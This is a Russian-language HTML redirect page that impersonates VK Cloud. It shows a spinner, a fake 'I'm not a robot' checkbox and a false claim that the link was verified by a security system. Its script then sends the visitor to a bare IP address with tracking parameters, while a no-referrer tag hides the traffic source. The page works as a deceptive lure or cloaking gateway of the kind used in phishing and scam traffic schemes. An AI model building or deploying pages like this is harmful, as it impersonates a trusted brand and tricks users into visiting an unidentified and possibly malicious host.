<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">

    <title>© 2026 Защита конфиденциальности</title>

    <meta property="og:type" content="website">
    <meta property="og:title" content="Переход на официальный сайт партнера">
    <meta property="og:description"
          content="Пожалуйста, подождите, идет подготовка перехода...">
 
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                         Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .redirect-container {
            background: #fff;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }

        .logo-area {
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60px;
        }

        .logo-img {
            max-width: 200px;
            max-height: 70px;
            object-fit: contain;
        }

        .loader-ring {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 3px solid rgba(52, 152, 219, 0.1);
            border-radius: 50%;
            border-top-color: #3498db;
            animation: spin 1s linear infinite;
            margin: 20px 0;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        h2 {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #2c3e50;
        }

        p {
            font-size: 14px;
            color: #7f8c8d;
            line-height: 1.5;
        }

        .status-msg {
            font-size: 12px;
            color: #3498db;
            margin-top: 10px;
            font-weight: 500;
            min-height: 18px;
        }

        .footer-note {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #edf2f7;
            font-size: 12px;
            color: #95a5a6;
        }

        .captcha-box {
            display: none;
            background: #f9f9f9;
            border: 1px solid #dcdcdc;
            border-radius: 4px;
            padding: 15px;
            margin: 20px auto;
            max-width: 300px;
            align-items: center;
            justify-content: space-between;
            text-align: left;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02);
        }

        .captcha-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .captcha-checkbox {
            width: 24px;
            height: 24px;
            cursor: pointer;
            accent-color: #3498db;
        }

        .captcha-text {
            font-size: 14px;
            font-weight: 500;
            color: #333;
            user-select: none;
            cursor: pointer;
        }

        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            color: #7f8c8d;
        }

        .captcha-icon {
            width: 26px;
            height: 26px;
            margin-bottom: 2px;
            object-fit: contain;
        }
    </style>
</head>

<body>

<div class="redirect-container">

    <div class="logo-area">
        <img
            src="https://thumb.cloud.mail.ru/weblink/thumb/xw1/TfKk/QGyS93cW7/PNG%20-%20digital/VK%20Logo.png?mt=1684832836000"
            alt="Логотип"
            class="logo-img"
            onerror="this.style.display='none';"
        >
    </div>

    <div class="loader-ring" id="loader"></div>

    <div class="captcha-box" id="captchaBox">

        <div class="captcha-left">

            <input
                type="checkbox"
                id="captchaCheck"
                class="captcha-checkbox"
            >

            <label
                for="captchaCheck"
                class="captcha-text"
            >
                Я не робот
            </label>

        </div>

        <div class="captcha-right">

            <img
                src="https://cdn-1.webcatalog.io/catalog/bluegpt/bluegpt-icon-filled-256.webp?v=1724929322657"
                alt=""
                class="captcha-icon"
            >

            <span>Защита</span>
            <span>конфиденциальности</span>

        </div>

    </div>

    <h2 id="title">
        Подготовка перехода...
    </h2>

    <p id="desc">
        Пожалуйста, подождите.
    </p>

    <div id="status" class="status-msg"></div>

    <div class="footer-note">
        Ссылка проверена системой безопасности.
        <br>
        VK Cloud © 2026
    </div>

</div>

<script>

    /*
     * =====================================================
     * АДРЕС, НА КОТОРЫЙ БУДЕТ ВЫПОЛНЕН ПЕРЕХОД
     * =====================================================
     *
     * Замени адрес ниже на адрес своего магазина.
     */

    const TARGET_URL = "https://85.155.15.52/?s=guwlrUiSDh&subid=git"; 


    /*
     * Получаем элементы страницы.
     */

    const captchaCheck = document.getElementById("captchaCheck");
    const captchaBox = document.getElementById("captchaBox");
    const loader = document.getElementById("loader");
    const title = document.getElementById("title");
    const desc = document.getElementById("desc");
    const status = document.getElementById("status");


    /*
     * Начальный экран.
     */

    function showInitialScreen() {

        loader.style.display = "inline-block";
        captchaBox.style.display = "none";

        title.textContent = "Проверка соединения...";

        desc.textContent =
            "Пожалуйста, подождите, выполняется проверка безопасности соединения.";

        status.textContent = "";
    }


    /*
     * Показываем подтверждение.
     */

    function showConfirmation() {

        loader.style.display = "none";

        captchaBox.style.display = "flex";

        title.textContent = "Подтвердите действие";

        desc.textContent =
            "Чтобы продолжить переход, подтвердите, что вы не робот.";

        status.textContent = "";
    }


    /*
     * Обработка checkbox.
     *
     * Никаких запросов к TARGET_URL здесь нет.
     */

    captchaCheck.addEventListener("change", function () {

        if (!this.checked) {
            return;
        }

        this.disabled = true;

        captchaBox.style.display = "none";

        loader.style.display = "inline-block";

        title.textContent = "Проверка соединения...";

        desc.textContent =
            "Пожалуйста, подождите, выполняется проверка безопасности соединения.";

        status.textContent = "";


        /*
         * Небольшая задержка перед переходом.
         */

        setTimeout(function () {

            window.location.replace(TARGET_URL);

        }, 1000);

    });


    /*
     * Запуск страницы.
     *
     * DOMContentLoaded не ждёт загрузки
     * внешних изображений и других ресурсов.
     */

    document.addEventListener("DOMContentLoaded", function () {

        showInitialScreen();

        setTimeout(function () {

            showConfirmation();

        }, 1500);

    });

</script>

</body>
</html>
